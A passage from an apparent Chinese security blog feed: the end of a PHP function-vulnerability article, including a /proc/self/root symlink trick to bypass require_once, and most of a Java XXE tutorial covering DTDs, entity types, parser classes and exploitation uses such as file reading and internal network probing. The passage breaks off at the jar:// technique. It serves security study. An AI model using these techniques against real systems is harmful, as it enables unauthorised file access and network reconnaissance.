href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854852&idx=1&sn=0154f9bc04d0eccf7069c4a70a55edef&chksm=bd5926898a2eaf9fd700b394150a34ce46b663f8cc018015559d99517aae8cdb2d2d1c687d95&scene=21#wechat_redirect" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（一）</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854862&idx=1&sn=cad6b970d2a7837358e1a29dc5b661b5&chksm=bd5926838a2eaf95f0f228164ee4d56455ae00ef14667eb4c3250ec63bab84aac26c407b6dcf&scene=21#wechat_redirect" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（二）</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854950&idx=1&sn=b04867a22cdef2fb7ce7a3c6ccad2985&chksm=bd59266b8a2eaf7d99d12dc18c19929f0765cf8b461b4b54271b22657232bda9d28e69fb698e&scene=21#wechat_redirect" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（三）</a></p><p><a href="https://mp.weixin.qq.com/s?src=11&timestamp=1598430966&ver=2545&signature=*gkExg6A061lOVJaSygcHg5kKE9y6D5HM4i1*uXCZamHlF-Vq3-84K0eORDpsJzDrCq7QrFxqI1fNupmHrRZBRYufy*HKwK*SEqO*-qCAtN*T5gfY3zg2jV988HZgN0z&new=1" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（完结）</a></p><h3 id="9-1-绕过-require-once-单次包含限制"><a href="#9-1-绕过-require-once-单次包含限制" class="headerlink" title="9.1 绕过 require_once 单次包含限制"></a>9.1 绕过 require_once 单次包含限制</h3><p>仅 Linux 环境下，<code>/proc/self/root/</code> 是指向 <code>/</code> 的符号链接，<code>/proc/self/root/</code> 多级符号链接(41次+)可绕过限制</p><p><a href="https://www.anquanke.com/post/id/213235" target="_blank" rel="noopener">https://www.anquanke.com/post/id/213235</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://flag0.com/2019/09/20/php弱类型/" target="_blank" rel="noopener">php弱类型 - flag0</a></li><li><a href="https://www.fuzzer.xyz/2019/03/13/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1(%E4%B8%8A)/" target="_blank" rel="noopener">php代码审计之函数漏洞审计(上) - Ethan</a></li><li><a href="https://www.fuzzer.xyz/2019/03/13/php代码审计之函数漏洞审计(下)/" target="_blank" rel="noopener">php代码审计之函数漏洞审计(下) - Ethan</a></li><li><a href="https://www.mi1k7ea.com/2019/06/20/PHP变量覆盖漏洞/" target="_blank" rel="noopener">PHP变量覆盖漏洞 - mi1k7ea</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文主要针对 PHP 函数相关的漏洞的总结，可能会偏向 CTF 方面，内容肯定不全，有空的话会持续更新，欢迎各位表哥补充以及对文章错误之处进行斧正！&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="PHP" scheme="https://jlkl.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Java XXE 漏洞</title>
    <link href="https://jlkl.github.io/2020/08/24/Java_03/"/>
    <id>https://jlkl.github.io/2020/08/24/Java_03/</id>
    <published>2020-08-24T11:47:41.000Z</published>
    <updated>2020-08-24T11:59:19.486Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-XML-基础"><a href="#1-XML-基础" class="headerlink" title="1 XML 基础"></a>1 XML 基础</h2><p>XML(可扩展标记语言，EXtensible Markup Language )，是一种标记语言，用来传输和存储数据</p><h3 id="1-1-XML文档结构"><a href="#1-1-XML文档结构" class="headerlink" title="1.1 XML文档结构"></a>1.1 XML文档结构</h3><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><a id="more"></a><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML申明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-DTD"><a href="#1-2-DTD" class="headerlink" title="1.2 DTD"></a>1.2 DTD</h3><p>DTD(文档类型定义，Document Type Definition )的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p><p><strong>DTD引用方式</strong></p><p>1）DTD 内部声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure><p>2）DTD 外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"外部DTD的URI"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3）引用公共DTD</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"DTD标识名"</span> <span class="meta-string">"公用DTD的URI"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD 关键字：</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li><li>ELEMENT（定义元素声明）</li></ul><p><strong>PCDATA</strong></p><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。<br>文本中的标签会被当作标记来处理，而实体会被展开。<br>不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p><p><strong>CDATA</strong></p><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h3 id="1-3-实体分类"><a href="#1-3-实体分类" class="headerlink" title="1.3 实体分类"></a>1.3 实体分类</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体/普通实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p>完整的实体类别可参考 <a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="noopener">DTD - Entities</a></p><h4 id="1-3-1-内置实体-Built-in-entities"><a href="#1-3-1-内置实体-Built-in-entities" class="headerlink" title="1.3.1 内置实体 (Built-in entities)"></a>1.3.1 内置实体 (Built-in entities)</h4><ul><li>&amp;符号: <code>&amp;amp</code>;</li><li>单引号: <code>&amp;apos</code>;</li><li>＞: <code>&amp;gt</code>;</li><li>＜: <code>&amp;lt</code>;</li><li>双引号: <code>&amp;quot</code>;</li></ul><h4 id="1-3-2-字符实体-Character-entities"><a href="#1-3-2-字符实体-Character-entities" class="headerlink" title="1.3.2 字符实体 (Character entities)"></a>1.3.2 字符实体 (Character entities)</h4><p>通常是 html 的实体编码，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "UTF-8" standalone = "yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">author</span>[</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ELEMENT <span class="meta-keyword">author</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">"&amp;#169;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&amp;#169</code> 即 <code>©</code></p><h4 id="1-3-3-普通实体-General-entities"><a href="#1-3-3-普通实体-General-entities" class="headerlink" title="1.3.3 普通实体 (General entities)"></a>1.3.3 普通实体 (General entities)</h4><p>简单理解即引用替换，语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">ename</span> <span class="meta-string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Example：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">source-text</span> <span class="meta-string">"tutorialspoint"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">   &amp;source-text;</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-3-4-参数实体-Parameter-entities"><a href="#1-3-4-参数实体-Parameter-entities" class="headerlink" title="1.3.4 参数实体 (Parameter entities)"></a>1.3.4 参数实体 (Parameter entities)</h4><p>参数实体的目的是创建动态替换的文本节</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % ename &quot;entity_value&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><em>entity_value</em> 可以是除 <code>&amp;</code>, <code>%</code> 或 <code>&quot;</code> 外所有字符</li></ul><p>test323.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">person</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"test323.dtd"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test323.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!ELEMENT person (name,addr,tel,br,email)&gt;  </span><br><span class="line">&lt;!ENTITY % name &quot;(#PCDATA)&quot;&gt;  </span><br><span class="line">&lt;!ELEMENT addr %name;&gt;  </span><br><span class="line">&lt;!ELEMENT tel %name;&gt;  </span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;  </span><br><span class="line">&lt;!ELEMENT email %name;&gt;</span><br></pre></td></tr></table></figure><p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p><h3 id="1-4-内部实体和外部实体"><a href="#1-4-内部实体和外部实体" class="headerlink" title="1.4 内部实体和外部实体"></a>1.4 内部实体和外部实体</h3><p>实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的声明方式。</p><p>内部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="1-5-通用实体和参数实体"><a href="#1-5-通用实体和参数实体" class="headerlink" title="1.5 通用实体和参数实体"></a>1.5 通用实体和参数实体</h3><p>其实按照使用来分类，又可以将实体分为通用实体和参数实体。</p><p><strong>通用实体</strong></p><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><p><strong>参数实体</strong></p><ol><li>使用 <code>% 实体名</code> (这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code> 引用</li><li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li><li>和通用实体一样，参数实体也可以外部引用</li></ol><h4 id="1-5-1-内部通用实体"><a href="#1-5-1-内部通用实体" class="headerlink" title="1.5.1 内部通用实体"></a>1.5.1 内部通用实体</h4><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br></pre></td></tr></table></figure><p>Example：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE author[</span><br><span class="line">    &lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure><h4 id="1-5-2-外部通用实体"><a href="#1-5-2-外部通用实体" class="headerlink" title="1.5.2 外部通用实体"></a>1.5.2 外部通用实体</h4><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>Example：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE author[</span><br><span class="line">    &lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure><h4 id="1-5-3-内部参数实体"><a href="#1-5-3-内部参数实体" class="headerlink" title="1.5.3 内部参数实体"></a>1.5.3 内部参数实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">person</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">name</span> <span class="meta-string">"(#PCDATA)"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">addr</span> %name;&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">tel</span> %name;&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">br</span> <span class="meta-keyword">EMPTY</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">email</span> %name;&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-5-4-外部参数实体"><a href="#1-5-4-外部参数实体" class="headerlink" title="1.5.4 外部参数实体"></a>1.5.4 外部参数实体</h4><p>test323.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">person</span> [  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">person</span> (<span class="meta-keyword">name</span>,<span class="meta-keyword">addr</span>,<span class="meta-keyword">tel</span>,<span class="meta-keyword">br</span>,<span class="meta-keyword">email</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % （注意这里有个空格）content <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"test323.dtd"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    %content;  </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test323.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!ELEMENT name (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT addr (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT tel (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;  </span><br><span class="line">&lt;!ELEMENT email (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="2-Java-XML-解析"><a href="#2-Java-XML-解析" class="headerlink" title="2 Java XML 解析"></a>2 Java XML 解析</h2><p>Java XML 解析 主要相关的函数</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.DocumentBuilderFactory</span>;</span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.SAXParser</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.TransformerFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.validation</span><span class="selector-class">.Validator</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.validation</span><span class="selector-class">.SchemaFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXTransformerFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXSource</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.XMLReader</span></span><br><span class="line"><span class="selector-tag">DocumentHelper</span><span class="selector-class">.parseText</span></span><br><span class="line"><span class="selector-tag">DocumentBuilder</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.helpers</span><span class="selector-class">.XMLReaderFactory</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.dom4j</span><span class="selector-class">.io</span><span class="selector-class">.SAXReader</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom2</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.bind</span><span class="selector-class">.Unmarshaller</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.xpath</span><span class="selector-class">.XpathExpression</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.stream</span><span class="selector-class">.XMLStreamReader</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.digester3</span><span class="selector-class">.Digester</span></span><br><span class="line"><span class="selector-tag">rg</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.SAXParseExceptionpublicId</span></span><br></pre></td></tr></table></figure><p>解析实例和防御方法可以查看：</p><p><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/31/Java-XXE-总结/</a></p><p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java" target="_blank" rel="noopener">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java</a></p><h2 id="3-Java-XXE-利用"><a href="#3-Java-XXE-利用" class="headerlink" title="3 Java XXE 利用"></a>3 Java XXE 利用</h2><p>各平台支持的协议如下</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824193247.png" alt="image-20200824193246228"></p><ol><li>其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35</li><li>libxml 是 PHP 的 xml 支持</li></ol><p>Java中的XXE支持 <code>sun.net.www.protocol</code> 里面的所有协议：http，https，file，ftp，mailto，jar，netdoc 。一般利用file协议读取文件、利用http协议探测内网，没有回显时可利用file协议结合http协议或ftp协议来读取文件。</p><p>Java XXE 的利用和 php 的查不多，总结一般的利用方式如下：</p><ul><li>file 协议读文件</li><li>内网主机探测</li><li>内网端口探测</li><li>DoS拒绝服务攻击</li></ul><p>详细可以查看：<code>https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解 XXE 漏洞/</code></p><p>区别于 PHP 的利用方式如下</p><h3 id="3-1-jar-文件上传"><a href="#3-1-jar-文件上传" class="headerlink" title="3.1 jar:// 文件上传"></a>3.1 jar:// 文件上传</h3><p>jar 